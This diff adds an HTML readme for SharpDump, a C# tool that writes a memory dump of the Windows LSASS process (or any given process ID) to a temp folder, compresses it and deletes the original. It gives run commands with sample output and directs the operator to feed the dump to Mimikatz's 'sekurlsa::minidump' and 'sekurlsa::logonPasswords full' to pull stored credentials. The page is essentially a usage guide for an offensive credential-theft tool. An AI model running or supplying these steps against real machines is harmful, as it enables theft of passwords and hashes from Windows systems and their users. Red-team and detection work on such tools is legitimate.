@@ -1,0 +1,39 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SharpDump</title>
+</head><body>SharpDump<br/>
+SharpDump is a essentially C# port of various PowerSploit’s Out-Minidump.ps1 functionality. The MiniDumpWriteDump Win32 API call is used to create a mini-dump for the process ID specified (LSASS by default) to C:\Windows\Temp\debug&lt;PID&gt;.out, GZipStream is used to compress the dump to C:\Windows\Temp\debug&lt;PID&gt;.bin (.gz format), and the original minidump file is deleted.<br/>
+<br/>
+To dump LSASS (the default):<br/>
+<br/>
+C:\Temp&gt;SharpDump.exe<br/>
+&nbsp;<br/>
+[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug808.out<br/>
+[+] Dump successful!<br/>
+&nbsp;<br/>
+[*] Compressing C:\WINDOWS\Temp\debug808.out to C:\WINDOWS\Temp\debug808.bin gzip file<br/>
+[*] Deleting C:\WINDOWS\Temp\debug808.out<br/>
+&nbsp;<br/>
+[+] Dumping completed. Rename file to "debug808.gz" to decompress.<br/>
+&nbsp;<br/>
+[*] Operating System : Windows 10 Enterprise N<br/>
+[*] Architecture &nbsp; &nbsp; : AMD64<br/>
+[*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch<br/>
+<br/>
+<br/>
+To dump a specific process ID:<br/>
+<br/>
+C:\Temp&gt;SharpDump.exe 8700<br/>
+<br/>
+[*] Dumping notepad++ (8700) to C:\WINDOWS\Temp\debug8700.out<br/>
+[+] Dump successful!<br/>
+<br/>
+[*] Compressing C:\WINDOWS\Temp\debug8700.out to C:\WINDOWS\Temp\debug8700.bin gzip file<br/>
+[*] Deleting C:\WINDOWS\Temp\debug8700.out<br/>
+<br/>
+[+] Dumping completed. Rename file to "debug8700.gz" to decompress.<br/>
+<br/>
+<br/>
+If dumping LSASS, this compressed minidump can then be downloaded, renamed to dump&lt;PID&gt;.gz, extracted, and run through Mimikatz’ sekurlsa::minidump functionality on a similar platform.</body></html>
